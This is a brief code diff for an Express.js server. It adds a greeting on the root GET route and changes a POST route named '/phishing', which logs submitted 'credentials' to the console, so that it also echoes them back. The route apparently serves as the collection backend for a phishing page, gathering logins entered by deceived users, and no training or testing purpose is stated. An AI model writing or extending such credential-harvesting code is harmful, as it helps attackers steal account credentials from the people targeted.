@@ -12,9 +12,16 @@ app.use(express.json( {
     limit: '10mb'
 }))
 
+app.get('/', (req, res) => {
+
+    res.json({ hello : 'you made a GET REQUEST'})
+
+})
+
 app.post('/phishing', (req, res) => {
     const body = req.body
     console.log(body.credentials)
+    res.json({credentials : body.credentials})
 })
 
 
